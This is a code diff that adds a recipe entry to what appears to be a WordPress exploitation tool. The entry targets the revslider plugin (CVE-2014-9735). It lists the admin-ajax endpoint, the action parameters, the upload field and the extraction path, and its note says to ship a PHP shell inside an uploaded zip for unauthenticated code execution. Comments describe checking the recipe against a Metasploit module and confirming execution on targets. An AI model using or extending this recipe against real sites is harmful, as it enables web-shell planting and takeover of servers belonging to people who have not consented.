@@ -25,6 +25,27 @@ RECIPES = [
         "source": "registry",
         "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/.",
     },
+    {
+        "plugin": "revslider",
+        "cve": "CVE-2014-9735",
+        "affected": "<=3.0.95",
+        "mode": "zip-extract",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "revslider_ajax_action", "client_action": "update_plugin"},
+        "field": "update_file",
+        "zip_inner_path": "revslider/{filename}",
+        "upload_path": "/wp-content/plugins/revslider/temp/update_extract/revslider/{filename}",
+        "source": "registry",
+        # Verified against the Metasploit module wp_revslider_upload_execute:
+        # update_plugin extracts the uploaded zip into temp/update_extract/, so a
+        # zip carrying revslider/<shell>.php lands reachable there. UNAUTH only on
+        # <=3.0.95 (the SoakSoak vector); modern revslider gates this behind admin.
+        # The fingerprinter can't read revslider's version, so MATCH may fire this
+        # on any revslider — VERIFY (confirmed exec) is what keeps it honest.
+        "note": "revslider_ajax_action/update_plugin extracts an attacker zip; ship "
+                "a PHP shell inside revslider/. Unauth in <=3.0.95.",
+    },
 ]
 
 
